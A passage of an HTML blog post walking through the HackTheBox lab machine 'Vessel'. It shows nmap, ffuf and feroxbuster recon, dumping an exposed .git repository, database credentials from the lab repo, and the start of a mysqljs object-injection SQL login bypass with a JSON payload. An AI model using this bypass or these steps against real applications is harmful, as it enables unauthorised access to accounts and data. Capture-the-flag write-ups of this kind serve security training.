@@ -1,0 +1,1232 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Vessel</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-vessel">htb-vessel</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#ffuf">ffuf</a> <a class="post-tag" href="/tags#nodejs">nodejs</a> <a class="post-tag" href="/tags#express">express</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#git">git</a> <a class="post-tag" href="/tags#git-dumper">git-dumper</a> <a class="post-tag" href="/tags#express-escape-functions">express-escape-functions</a> <a class="post-tag" href="/tags#escape-functions">escape-functions</a> <a class="post-tag" href="/tags#mysqljs">mysqljs</a> <a class="post-tag" href="/tags#mysqljs-escape-functions">mysqljs-escape-functions</a> <a class="post-tag" href="/tags#cve-2022-24637">cve-2022-24637</a> <a class="post-tag" href="/tags#source-code">source-code</a> <a class="post-tag" href="/tags#github">github</a> <a class="post-tag" href="/tags#mass-assignment">mass-assignment</a> <a class="post-tag" href="/tags#log-poisoning">log-poisoning</a> <a class="post-tag" href="/tags#webshell">webshell</a> <a class="post-tag" href="/tags#php">php</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#pyinstaller">pyinstaller</a> <a class="post-tag" href="/tags#pyinstxtractor">pyinstxtractor</a> <a class="post-tag" href="/tags#uncompyle6">uncompyle6</a> <a class="post-tag" href="/tags#python-pyside2">python-pyside2</a> <a class="post-tag" href="/tags#python-qt">python-qt</a> <a class="post-tag" href="/tags#pdfcrack">pdfcrack</a> <a class="post-tag" href="/tags#cve-2022-0811">cve-2022-0811</a> <a class="post-tag" href="/tags#virustotal">virustotal</a> <a class="post-tag" href="/tags#pinns">pinns</a> <a class="post-tag" href="/tags#crio">crio</a> <a class="post-tag" href="/tags#kernel-parameters">kernel-parameters</a> <a class="post-tag" href="/tags#crash-dump">crash-dump</a> <a class="post-tag" href="/tags#youtube">youtube</a> <a class="post-tag" href="/tags#htb-updown">htb-updown</a> </span><br/><br/>
+<time class="dt-published" datetime="2023-03-25T13:45:00+00:00" itemprop="datePublished">Mar 25, 2023
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2023/03/25/htb-vessel.html" style="color: #e6e6e6; text-decoration: none;">HTB: Vessel</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/vessel-cover.webp" type="image/webp"/>
+<img alt="Vessel-cover" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/vessel-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Vessel is a really clever box with some nice design. Several of the bugs are publicly disclosed, but at the time of release didn’t have public exploit, so they required digging into the tech to figure out how to abuse them. I’ll start by pulling a git repo from the website, and find an unsafe call to MySQL from Express. This bug is surprising, as the code looks good, and I’ll dig into it more in Beyond Root. After abusing the type confusion to get SQL injection and a hash, I’ll log in and find a link to a new subdomain hosting an instance of Open Web Analytics. I’ll abuse an information discloser vulnerability to get admin access to OWA, and then a mass assignment vuln to move a log into a web-accessible directory and poison that log to get execution and a shell. I’ll reverse a PyInstaller-generated exe to recover a password to pivot to the next user. From there, I’ll abuse a SetUID binary that’s part of CRI-O to change kernel parameters and get a shell as root.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/492 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/vessel" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Vessel</a> <a href="https://hackthebox.com/machines/vessel" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-vessel.webp" type="image/webp"/> <img alt="Vessel" class="img-av" src="/icons/box-vessel.png"/></picture></a><br/><a href="https://hackthebox.com/machines/vessel" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1562801992518766593">27 Aug 2022</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">25 Mar 2023</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/vessel-diff.webp" type="image/webp"/><img alt="Rated difficulty for Vessel" src="/img/vessel-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/vessel-radar.webp" type="image/webp"/><img alt="Radar chart for Vessel" src="/img/vessel-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">03:23:16</span><a href="https://app.hackthebox.com/users/183082" rel="noopener" target="_blank"><img alt="Coaran" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/183082" style="display: unset"/><span class="user-text" style="display: none"> Coaran</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">04:20:10</span><a href="https://app.hackthebox.com/users/476556" rel="noopener" target="_blank"><img alt="irogir" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/476556" style="display: unset"/><span class="user-text" style="display: none"> irogir</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/480031" rel="noopener" target="_blank"><img alt="0xM4hm0ud" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/480031" style="display: unset"/><span class="user-text" style="display: none"> 0xM4hm0ud</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.178
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-14 17:22 EDT
+Nmap scan report for 10.10.11.178
+Host is up (0.087s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 6.97 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> 10.10.11.178
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-14 17:23 EDT
+Nmap scan report for 10.10.11.178
+Host is up (0.093s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Vessel
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.90 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=apache2">Apache</a> versions, the host is likely running Ubuntu 20.04 focal.</p>
+<h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
+<p>While I haven’t seen it yet, there’s a domain, <code class="language-plaintext highlighter-rouge">vessel.htb</code> on the webpage. Given the use of domain names, I’ll check for any subdomains that respond differently than the default page with <code class="language-plaintext highlighter-rouge">ffuf</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ffuf <span class="nt">-u</span> http://10.10.11.178 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.vessel.htb"</span> <span class="nt">-mc</span> all <span class="nt">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">-fs</span> 15030
+<span class="go">
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/                                                                  
+
+       v2.0.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.178
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.vessel.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 15030
+________________________________________________
+
+:: Progress: [4989/4989] :: Job [1/1] :: 418 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>Nothing here.</p>
+<h3 id="vesselhtb---tcp-80">vessel.htb - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The website is some kind of consulting company:</p>
+<div style="max-height: 400px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20230314172650683.png">
+<img alt="image-20230314172650683" src="https://0xdfimages.gitlab.io/img/image-20230314172650683.png" style="clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 375px"><a href="https://0xdfimages.gitlab.io/img/image-20230314172650683.png"><i>Click for full image</i></a></div>
+</div>
+<p>There is a contact form at the bottom. If I fill it out and submit, it says submission successful:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230314172821161.webp" type="image/webp"/>
+<img alt="image-20230314172821161" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230314172821161.png"/>
+</picture>
+<p>But looking in Burp Proxy, no request is sent, so it’s likely just a dummy form.</p>
+<p>Just below that, it does list the domain name <code class="language-plaintext highlighter-rouge">vessel.htb</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230314174852213.webp" type="image/webp"/>
+<img alt="image-20230314174852213" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230314174852213.png"/>
+</picture>
+<p>There is a link to login in the nav bar, which leads to <code class="language-plaintext highlighter-rouge">/login</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230314172925544.webp" type="image/webp"/>
+<img alt="image-20230314172925544" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230314172925544.png"/>
+</picture>
+<p>There’s a link for “Forgot Password?” that leads to <code class="language-plaintext highlighter-rouge">/reset</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230314173105060.webp" type="image/webp"/>
+<img alt="image-20230314173105060" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230314173105060.png"/>
+</picture>
+<p>And “Need an account? Sign up!”, which leads to <code class="language-plaintext highlighter-rouge">/register</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230314173139289.webp" type="image/webp"/>
+<img alt="image-20230314173139289" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230314173139289.png"/>
+</picture>
+<p>When I try to register, it just says it’s not available:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230314173214657.webp" type="image/webp"/>
+<img alt="image-20230314173214657" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230314173214657.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP headers show that it is running the NodeJS framework <a href="https://expressjs.com/">ExpressJS</a>:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 14 Mar 2023 21:24:41 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.41 (Ubuntu)</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">Express</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">W/"3ab6-fxJsnDvEyrs1BpGR1cM7Ovl8AME-gzip"</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">15030</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+</code></pre></div></div>
+<p>There’s no <code class="language-plaintext highlighter-rouge">index.html</code> file, and the paths seem to be extensionless, which makes sense for Express.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.11.178
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.8.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.178
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.8.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-cyan">WLD</span><span class="go">        -         -         -         - http://10.10.11.178 =&gt; </span><span class="feroxbuster-yellow">auto-filtering 404-like response (26 bytes); toggle this behavior by using --dont-filter</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET       10l       16w      173c http://10.10.11.178/css =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.178/css/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      243l      871w    15030c http://10.10.11.178/
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        1l        4w       28c http://10.10.11.178/admin =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.178/login</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        1l        4w       28c http://10.10.11.178/Admin =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.178/login</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET       10l       16w      173c http://10.10.11.178/dev =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.178/dev/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       70l      182w     4213c http://10.10.11.178/Login
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       51l      125w     2393c http://10.10.11.178/404
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        1l        4w       28c http://10.10.11.178/ADMIN =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.178/login</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       51l      117w     2335c http://10.10.11.178/500
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       89l      234w     5830c http://10.10.11.178/Register
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        1l        4w       28c http://10.10.11.178/Logout =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.178/login</span><span class="go">
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        9l       28w      277c http://10.10.11.178/server-status
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       63l      177w     3637c http://10.10.11.178/reset
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       52l      120w     2400c http://10.10.11.178/401
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       70l      182w     4213c http://10.10.11.178/LOGIN
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       63l      177w     3637c http://10.10.11.178/Reset
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 1m     90000/90000   0s      </span><span class="feroxbuster-green">found</span><span class="go">:16      </span><span class="feroxbuster-red">errors</span><span class="go">:149    
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     30004/30000   423/s   http://10.10.11.178/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     30004/30000   428/s   http://10.10.11.178/css/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     30004/30000   453/s   http://10.10.11.178/dev/ 
+</span></code></pre></div></div>
+<p>There’s a few things of interest. <code class="language-plaintext highlighter-rouge">/dev</code> returns a redirect to <code class="language-plaintext highlighter-rouge">/dev/</code> which just returns a redirect to a custom 404 page at <code class="language-plaintext highlighter-rouge">/404</code>.</p>
+<p><code class="language-plaintext highlighter-rouge">/admin</code> seems interesting, but it leads back to <code class="language-plaintext highlighter-rouge">/login</code>, suggesting it requires auth.</p>
+<h4 id="identify-git">Identify .git</h4>
+<p>This cost me a bunch of time on initially solving the box. I’ve talked <a href="/2023/01/21/htb-updown.html#identify-git-repo">before</a> about how identifying Git repos is a weakness in my methodology. Knowing this, I’ve been often brute forcing with <code class="language-plaintext highlighter-rouge">raft-small-words.txt</code> because it will check for <code class="language-plaintext highlighter-rouge">.git</code> (been considering going there as a default, which I could now set in the <a href="https://youtu.be/d4tYWJzZ8QE?t=341">Feroxbuster config file</a>). But even that wouldn’t find anything on Vessel.</p>
+<p>It turns out that <code class="language-plaintext highlighter-rouge">/dev/.git</code> returns a redirect to <code class="language-plaintext highlighter-rouge">/404</code> just like anything else on the site that doesn’t exist. But <code class="language-plaintext highlighter-rouge">/dev/.git/config</code> returns something:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://vessel.htb/dev/.git/config
+<span class="go">[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[user]
+        name = Ethan
+        email = ethan@vessel.htb
+</span></code></pre></div></div>
+<p>This can be found with something like <code class="language-plaintext highlighter-rouge">common.txt</code> (in <a href="https://github.com/danielmiessler/SecLists">SecLists</a>), which includes not only <code class="language-plaintext highlighter-rouge">.git</code> but a few files inside the folder as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">grep</span> <span class="s1">'^.git/'</span> /opt/SecLists/Discovery/Web-Content/common.txt 
+<span class="go">.git/HEAD
+.git/config
+.git/index
+.git/logs/
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">feroxbuster</code> with this wordlist does find the repo:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.11.178/ <span class="nt">-w</span> /opt/SecLists/Discovery/Web-Content/common.txt
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.8.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.178/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/common.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.8.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-cyan">WLD</span><span class="go">        -         -         -         - http://10.10.11.178/ =&gt; </span><span class="feroxbuster-yellow">auto-filtering 404-like response (26 bytes); toggle this behavior by using --dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      243l      871w    15030c http://10.10.11.178/
+...[snip]...
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l        2w       23c http://10.10.11.178/dev/.git/HEAD
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       19l       55w     3596c http://10.10.11.178/dev/.git/index
+...[snip]...
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        8l       20w      139c http://10.10.11.178/dev/.git/config...[snip]...
+</span></code></pre></div></div>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="authenticated-site-access">Authenticated Site Access</h3>
+<h4 id="download-repo">Download Repo</h4>
+<p><a href="https://github.com/arthaud/git-dumper">git-dumper</a> is a nice way to pull the repo from the website (<code class="language-plaintext highlighter-rouge">pipx install git-dumper</code>). I’ll give it the url to the directory with a <code class="language-plaintext highlighter-rouge">.git</code> repo and a directory to save in:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">mkdir </span>git
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>git-dumper http://vessel.htb/dev git             
+<span class="go">[-] Testing http://vessel.htb/dev/.git/HEAD [200]
+[-] Testing http://vessel.htb/dev/.git/ [302]
+[-] Fetching common files
+...[snip]...
+[-] Fetching http://vessel.htb/dev/.git/objects/d0/2d9b464fe19e78d4cda32b7e19ae62200c7140 [200]
+[-] Running git checkout . 
+</span></code></pre></div></div>
+<p>The last thing the script does it <code class="language-plaintext highlighter-rouge">git checkout</code> to get the latest commit. The files are there:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">config  index.js  public  routes  views
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>git status 
+<span class="go">On branch master
+nothing to commit, working tree clean
+</span></code></pre></div></div>
+<h4 id="repo-analysis">Repo Analysis</h4>
+<p>There’s only a couple commits in this repo:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git log <span class="nt">--oneline</span> 
+<span class="go">208167e (HEAD -&gt; master) Potential security fixes
+edb18f3 Security Fixes
+f1369cf Initial commit
+</span></code></pre></div></div>
+<p>From “Initial commit” to “Security Fixes”, the only thing that changes is removing an obvious SQL injection:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>git diff f1369cf edb18f3
+<span class="go">diff --git a/routes/index.js b/routes/index.js
+index be2adb1..0cf479c 100644
+</span><span class="diff-removed">--- a/routes/index.js
+</span><span class="diff-added">+++ b/routes/index.js
+</span><span class="diff-lines">@@ -61,7 +61,7 @@ router.post('/api/login', function(req, res) {
+</span><span class="go">        let username = req.body.username;
+        let password = req.body.password;
+        if (username &amp;&amp; password) {
+</span><span class="diff-removed">-               connection.query("SELECT * FROM accounts WHERE username = '" + username + "' AND password = '" + password + "'", function(error, results, fields) {
+</span><span class="diff-added">+               connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) {
+</span><span class="go">                        if (error) throw error;
+                        if (results.length &gt; 0) {
+                                req.session.loggedin = true;
+</span></code></pre></div></div>
+<p>The next change just adds a comment:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>git diff edb18f3 208167e
+<span class="go">diff --git a/routes/index.js b/routes/index.js
+index 0cf479c..69c22be 100644
+</span><span class="diff-removed">--- a/routes/index.js
+</span><span class="diff-added">+++ b/routes/index.js
+</span><span class="diff-lines">@@ -1,6 +1,6 @@
+</span><span class="go"> var express = require('express');
+ var router = express.Router();
+</span><span class="diff-removed">-var mysql = require('mysql');
+</span><span class="diff-added">+var mysql = require('mysql'); /* Upgraded deprecated mysqljs */
+</span><span class="go"> var flash = require('connect-flash');
+ var db = require('../config/db.js');
+ var connection = mysql.createConnection(db.db)
+</span></code></pre></div></div>
+<p>It’s not clear what they mean by “Upgraded deprecated mysqljs”.</p>
+<p>The <code class="language-plaintext highlighter-rouge">config/db.js</code> file has MySQL creds:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">mysql</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mysql</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="kd">var</span> <span class="nx">connection</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="na">db</span><span class="p">:</span> <span class="p">{</span>
+        <span class="na">host</span>     <span class="p">:</span> <span class="dl">'</span><span class="s1">localhost</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">user</span>     <span class="p">:</span> <span class="dl">'</span><span class="s1">default</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">password</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">daqvACHKvRn84VdVp</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">database</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">vessel</span><span class="dl">'</span>
+<span class="p">}};</span>
+
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">connection</span><span class="p">;</span>
+</code></pre></div></div>
+<p>I’ll note these, though they don’t end up being needed.</p>
+<h4 id="bypass-login">Bypass Login</h4>
+<p>When I Google “mysqljs sql injection”, the top result is a post on Medium titled <a href="https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4">Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql</a>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230320162004010.webp" type="image/webp"/>
+<img alt="image-20230320162004010" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230320162004010.png"/>
+</picture>
+<p>In fact, the vulnerable code sample in that post looks exactly like the one in the repo:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230320162147523.webp" type="image/webp"/>
+<img alt="image-20230320162147523" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230320162147523.png"/>
+</picture>
+<p>Query escape functions like above are meant to fill replace the <code class="language-plaintext highlighter-rouge">?</code> with the strings and not allow any code there such as open/close quotes or equals signs. However, Express mis-handles how different object types are passed into these function. Looking at the example above, if the data submitted is:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Then Express / mysqljs will take that and make the following query:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">accounts</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="nv">`password`</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</code></pre></div></div>
+<p>That will simplify further to:</p>
